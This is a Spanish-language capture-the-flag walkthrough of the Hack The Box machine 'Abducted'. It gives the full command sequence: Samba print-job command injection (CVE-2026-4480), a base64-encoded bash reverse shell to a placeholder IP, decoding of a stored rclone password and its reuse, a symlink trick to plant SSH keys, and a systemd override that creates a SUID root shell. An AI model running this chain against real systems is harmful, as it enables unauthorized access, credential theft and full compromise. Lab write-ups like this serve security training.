---
created: 2026-8-3
description: Abducted es una máquina Linux que expone un servicio SMB vulnerable a CVE-2026-4480, lo que permite la ejecución remota de código sin autenticación mediante un trabajo de impresión malicioso. El acceso inicial conduce a la reutilización de credenciales a través de una configuración expuesta de rclone, seguida de movimiento lateral mediante el abuso de enlaces simbólicos de Samba y escalada de privilegios explotando overrides escribibles de servicios systemd.
---

#htb #medium #linux #smb #null-auth #print-spooler #cve-2026-4480 #rce #cron #rclone #credentials-reuse #symlink #smb-wide-links #systemd #service-overrides
# Enumeración
## Nmap

```bash
[hvidal@fedora] ~/d/h/h/m/a/scan
❯ nmap -p- --open -vvv --min-rate 5000 -n 10.129.244.177 -oG scan
Discovered open port 22/tcp on 10.129.244.177
Discovered open port 139/tcp on 10.129.244.177
Discovered open port 445/tcp on 10.129.244.177
```

Puertos abiertos: 22,139,445

```bash
[hvidal@fedora] ~/d/h/h/m/a/scan
❯ nmap -p 22,139,445 -sCV 10.129.244.177 -oN portscan.txt -Pn
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Host script results:
|_nbstat: NetBIOS name: ABDUCTED, NetBIOS user: <unknown>
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
```

## SMB

Comprobar si **Null Auth** está habilitado.
```bash
[hvidal@fedora] ~/d/h/h/m/a/scan
❯ nxc smb 10.129.244.177 -u '' -p ''
SMB   10.129.244.177  445    ABDUCTED   [*] Unix - Samba (name:ABDUCTED) (domain:ABDUCTED) (signing:True) (SMBv1:None) (Null Auth:True)
```

Listar los recursos compartidos.
```bash
[hvidal@fedora] ~/d/h/h/m/a/scan
❯ nxc smb 10.129.244.177 -u '' -p '' --shares
Share           Remark
-----           ------
HP-Reception    Reception printer
projects        Hartley Group Project Files
transfer        Staff file transfer
IPC$            IPC Service (Hartley Group Document Services)
```

El único recurso compartido accesible como invitado es `HP-Reception`.
```bash
[hvidal@fedora] ~/d/h/h/m/a/scan
❯ smbclient //10.129.244.177/HP-Reception -N
```

Recopilar información adicional del servicio SMB.
```bash
rpcclient -U "" -N 10.129.244.177 -c "srvinfo"
	ABDUCTED       Wk Sv PrQ Unx NT SNT Hartley Group Document Services
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03
```

La `os version` reportada indica que el host parece relativamente antiguo, aunque no revela la versión exacta de Samba. Sin embargo, la presencia de un recurso compartido de impresora accesible como invitado coincide con las condiciones previas requeridas por CVE-2026-4480, lo que lo convierte en un buen candidato para realizar más pruebas.

# Acceso inicial

[CVE-2026-4480](https://github.com/TheCyberGeek/CVE-2026-4480-PoC) afecta a Samba cuando está configurado con un comando de impresión similar a:
```bash
print command = /usr/local/bin/handle_job.sh %s %J
```

La macro `%J` se reemplaza con el nombre del documento controlado por el usuario, sustituyendo únicamente `'` por `_`, lo que permite que caracteres como `|`, `;`, etc. sean interpretados por la shell.

Al establecer el nombre del documento como `|sh`, el comando de impresión se convierte en una tubería de shell, haciendo que el contenido del archivo se redirija a `sh` y se ejecute.

Crear un archivo llamado `|sh` con una petición `curl`.
```bash
[hvidal@fedora] ~/d/h/h/m/a/content
❯ echo "curl IP:8080" > "|sh"
```

Levantar un servidor HTTP de Python.
```bash
[hvidal@fedora] ~/d/h/h/m/a/scan
❯ python -m http.server 8080
```

Crear un trabajo de impresión.
```bash
[hvidal@fedora] ~/d/h/h/m/a/content
❯ smbclient //10.129.244.177/HP-Reception -N -c 'print "|sh"'
```

Comprobar el servidor HTTP.
```bash
10.129.244.177 - - [02/Aug/2026 21:12:27] "GET / HTTP/1.1" 200
```

Recibir la petición HTTP confirma que el payload se ejecutó correctamente, lo que indica que el servidor es vulnerable.
# Explotación

## SMB

Codificar una reverse shell de bash en Base64.
```bash
[hvidal@fedora] ~/d/h/h/m/a/content
❯ echo "bash -i >& /dev/tcp/IP/4444 0>&1" | base64
```

Escribir el payload codificado en Base64 en un archivo llamado `|sh`.
```bash
[hvidal@fedora] ~/d/h/h/m/a/content
❯ echo "echo <Base64 output> | base64 -d | bash" > "|sh"
```

Iniciar un listener.
```bash
[hvidal@fedora] ~/d/h/h/m/a/scan
❯ nc -lnvp 4444
```

Crear un trabajo de impresión.
```bash
[hvidal@fedora] ~/d/h/h/m/a/content
❯ smbclient //10.129.244.177/HP-Reception -N -c 'print "|sh"'
```

## Post-explotación

Enumerar las tareas de `cron`.
```bash
nobody@abducted:/$ ls -R /etc/cron*   
/etc/cron.d:
e2scrub_all
offsite-backup
sysstat
```

Leer la tarea de backup.
```bash
nobody@abducted:/$ cat /etc/cron.d/offsite-backup
30 2 * * * root /opt/offsite-backup/sync.sh >/dev/null 2>&1
```

El script `sync.sh` utiliza `rclone` para sincronizar `/srv/projects` con un servidor SFTP externo.
```bash
nobody@abducted:/$ cat /opt/offsite-backup/sync.sh
#!/bin/bash
/usr/bin/rclone --config /opt/offsite-backup/rclone.conf sync /srv/projects offsite:projects
```

Leer el archivo de configuración de `rclone`.
```bash
nobody@abducted:/$ cat /opt/offsite-backup/rclone.conf
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix
```

Revelar la contraseña ofuscada.
```bash
nobody@abducted:/$ rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
iXzvcib3SrpZ
```

La contraseña es reutilizada por el usuario `scott`, lo que permite el acceso por SSH.
```bash
[hvidal@fedora] ~/d/h/h/m/a/content
❯ ssh scott@10.129.244.177
```

Leer la flag de usuario.
```bash
scott@abducted:~$ cat user.txt
```

# Movimiento lateral

## Enumeración de SMB

Leer el archivo de configuración de Samba.
```bash
scott@abducted:~$ cat /etc/samba/shares.conf
[transfer]
   comment = Staff file transfer
   path = /srv/transfer
   valid users = scott
   force user = marcus
   read only = no
   wide links = yes
   browseable = yes
```

El recurso compartido `transfer` está configurado con `force user = marcus`. Por lo tanto, cada operación sobre archivos realizada a través del recurso compartido se ejecuta como `marcus`. Además, `wide links` está habilitado, lo que permite que Samba siga enlaces simbólicos fuera del directorio compartido.
Como `scott` es propietario de `/srv/transfer`, se puede crear un enlace simbólico que apunte al directorio personal de `marcus`, permitiendo escribir un archivo `authorized_keys` en `/home/marcus/.ssh`.

## Explotación

Crear la clave SSH.
```bash
scott@abducted:/tmp$ ssh-keygen -t ed25519 -q -N '' -f /tmp/ssh
```

Crear el enlace simbólico en `/srv/transfer`.
```bash
scott@abducted:/srv/transfer$ ln -s /home/marcus marcus
```

Crear el archivo `authorized_keys` en `tmp`.
```bash
scott@abducted:/tmp$ cat ssh.pub > authorized_keys
```

Subir el archivo `authorized_keys` a `marcus/.ssh`
```bash
scott@abducted:/tmp$ smbclient //127.0.0.1/transfer -U scott%iXzvcib3SrpZ -c "mkdir marcus/.ssh; put /tmp/authorized_keys marcus/.ssh/authorized_keys"
```

Conectarse a `marcus` mediante SSH.
```bash
scott@abducted:/tmp$ ssh -i ssh marcus@127.0.0.1
```

# Escalada de privilegios

## Enumeración

`marcus` es miembro del grupo no estándar `operators`.
```bash
marcus@abducted:~$ id
uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
```

Buscar los archivos escribibles por el grupo.
```bash
marcus@abducted:~$ find / -group operators -perm -g=w 2>/dev/null
/etc/systemd/system/smbd.service.d
```

`marcus` tiene permisos de escritura en el directorio de *drop-in overrides* del servicio `smbd.service`. Este directorio se utiliza para almacenar archivos de override que modifican la configuración original del servicio `systemd`.

Comprobar si `marcus` puede reiniciar el servicio.
```bash
marcus@abducted:~$ systemctl restart smbd
```

Dado que `marcus` puede tanto reiniciar el servicio `smbd` como escribir archivos de override en `/etc/systemd/system/smbd.service.d`, es posible ejecutar comandos arbitrarios como `root` modificando la configuración del servicio.
## Explotación

Crear un archivo de override de `systemd` en `/etc/systemd/system/smbd.service.d` que copie `/bin/bash` a `tmp` y le asigne permisos SUID.
```bash
marcus@abducted:~$ cat > /etc/systemd/system/smbd.service.d/override.conf <<'EOF'
[Service]
ExecStartPre=/bin/cp /bin/bash /tmp/suid_bash
ExecStartPre=/bin/chmod 4755 /tmp/suid_bash
EOF
```

Recargar el servicio.
```bash
marcus@abducted:~$ systemctl daemon-reload
marcus@abducted:~$ systemctl restart smbd
```

Ejecutar la copia SUID de `bash` para obtener una shell de `root`.
```bash
marcus@abducted:/tmp$ ./suid_bash -p
```

Leer la flag de `root`.
```bash
suid_bash-5.2$ cat /root/root.txt
```